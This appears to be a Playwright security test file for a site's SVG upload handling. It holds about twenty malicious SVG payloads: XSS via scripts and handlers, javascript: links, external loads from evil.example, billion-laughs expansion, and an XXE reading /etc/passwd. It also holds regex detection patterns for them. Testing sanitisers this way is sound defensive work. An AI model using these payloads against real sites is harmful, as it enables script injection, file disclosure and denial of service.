import { test, expect, withRetry } from '../fixtures';
import { AUTH_FILE, header } from '../helpers';
import { upload, removeAsset, svg } from '../uploads';

// Step 4: an SVG is a small program as much as a picture (scripts, event handlers, links, external files). Every file below is an attack that
// has worked somewhere. For each one the site must either refuse it, or keep only a harmless version, and serve what it keeps in a locked box.
test.use({ storageState: AUTH_FILE });

const ATTACKS: [string, Buffer][] = [
  ['script element', svg('<script>alert(document.cookie)</script><circle r="5"/>')],
  ['script in CDATA', svg('<script><![CDATA[alert(1)]]></script>')],
  ['UPPER-CASE and odd spacing', Buffer.from('<SVG xmlns="http://www.w3.org/2000/svg"><SCRIPT >alert(1)</SCRIPT ></SVG>')],
  ['onload attribute on the root', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="5"/></svg>')],
  ['svg/onload with no space', Buffer.from('<svg/onload=alert(1) xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>')],
  ['onclick on a shape', svg('<rect width="10" height="10" onclick="alert(1)" onmouseover="alert(2)"/>')],
  ['foreignObject holding HTML', svg('<foreignObject width="100" height="50"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)><script>alert(1)</script></body></foreignObject>')],
  ['javascript: link', svg('<a xlink:href="javascript:alert(1)" xmlns:xlink="http://www.w3.org/1999/xlink"><rect width="10" height="10"/></a>')],
  ['javascript: with entities and whitespace', svg('<a href="jav&#x09;ascript:alert(1)"><rect width="10" height="10"/></a>')],
  ['use pointing at another site', svg('<use href="http://evil.example/x.svg#a"/>')],
  ['image loaded from another site (tracking / SSRF)', svg('<image href="http://evil.example/pixel.png" width="10" height="10"/>')],
  ['image holding an HTML data: document', svg('<image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="10" height="10"/>')],
  ['stylesheet @import from another site', svg('<style>@import url(http://evil.example/x.css); circle{fill:red}</style><circle r="5"/>')],
  ['style attribute that fetches or runs something', svg('<rect width="10" height="10" style="fill:url(http://evil.example/p); behavior:url(x.htc); background:url(javascript:alert(1))"/>')],
  ['animation that sets a handler or a link', svg('<a><set attributeName="href" to="javascript:alert(1)"/><animate attributeName="onmouseover" values="alert(1)"/><rect width="10" height="10"/></a>')],
  ['iframe / embed / object', svg('<iframe src="http://evil.example"></iframe><embed src="x"/><object data="x"></object>')],
  ['XML entity expansion ("billion laughs")', Buffer.from('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>')],
  ['external entity (reads a file / makes a request)', Buffer.from('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>')],
  ['processing instruction loading a stylesheet', Buffer.from('<?xml version="1.0"?><?xml-stylesheet href="http://evil.example/x.css" type="text/css"?><svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>')],
  ['UTF-16 text (a way to slip past byte filters)', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'utf16le')])],
  ['null bytes inside the tag name', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><scr\0ipt>alert(1)</scr\0ipt></svg>')],
];
// What must never appear in a version the site keeps
const FORBIDDEN: [string, RegExp][] = [
  ['a script', /<\s*script/i], ['an event handler', /\bon[a-z]+\s*=/i], ['javascript:', /javascript\s*:/i], ['vbscript:', /vbscript\s*:/i], ['foreignObject', /foreignobject/i],
  ['iframe/embed/object', /<\s*(iframe|embed|object)/i], ['an external address', /(?:href|src)\s*=\s*["']?\s*(?:https?:)?\/\//i], ['an @import', /@import/i], ['a url() to another site', /url\(\s*["']?\s*(?:https?:)?\/\//i],
  ['an entity', /<!ENTITY/i], ['a doctype', /<!DOCTYPE/i], ['a stylesheet instruction', /<\?xml-stylesheet/i], ['an HTML data: document', /data:text\/html/i], ['behavior:', /behavior\s*:/i], ['animation of an attribute', /<\s*(animate|set)\b/i],
];

for (const [name, bytes] of ATTACKS) {
  test(`${name}: refused, or kept only in a harmless form`, async ({ playwright, baseURL }) => {
    const a = withRetry(await playwright.request.newContext({ baseURL, storageState: AUTH_FILE })), visitor = withRetry(await playwright.request.newContext({ baseURL, storageState: { cookies: [], origins: [] } }));
    const r = await upload(a, baseURL!, 'evil.svg', 'image/svg+xml', bytes, 'An attack');
    if (r.status === 400) { expect(r.json.ok).toBe(false); await a.dispose(); await visitor.dispose(); return; }   // refused: fine
    expect(r.status, JSON.stringify(r.json)).toBe(200);
    const served = await visitor.get(r.json.asset.url), body = await served.text();
    const found = FORBIDDEN.filter(([, re]) => re.test(body)).map(([n]) => n);
    expect(found, `kept version still contains ${found.join(', ')}: ${body.slice(0, 200)}`).toEqual([]);
    // and whatever is kept is served in a locked box, as an image and never as a page
    expect(header(served, 'content-type')).toBe('image/svg+xml'); expect(header(served, 'x-content-type-options')).toBe('nosniff');
    const csp = header(served, 'content-security-policy'); expect(csp).toContain("default-src 'none'"); expect(csp).toContain('sandbox');
    await removeAsset(a, baseURL!, r.json.asset.id); await a.dispose(); await visitor.dispose();
  });
}

test('a normal SVG is accepted, keeps its drawing, and is measured from its viewBox', async ({ playwright, baseURL }) => {
  const a = withRetry(await playwright.request.newContext({ baseURL, storageState: AUTH_FILE })), visitor = withRetry(await playwright.request.newContext({ baseURL, storageState: { cookies: [], origins: [] } }));
  const r = await upload(a, baseURL!, 'logo.svg', 'image/svg+xml', svg('<circle cx="50" cy="25" r="20" fill="#e63d12"/><path d="M10 10h30" stroke="black"/>'), 'A logo');
  expect(r.status, JSON.stringify(r.json)).toBe(200);
  const body = await (await visitor.get(r.json.asset.url)).text();
  expect(body).toContain('<circle'); expect(body).toContain('#e63d12'); expect(body).toContain('<path');
  expect([r.json.asset.width, r.json.asset.height]).toEqual([100, 50]);
  await removeAsset(a, baseURL!, r.json.asset.id); await a.dispose(); await visitor.dispose();
});
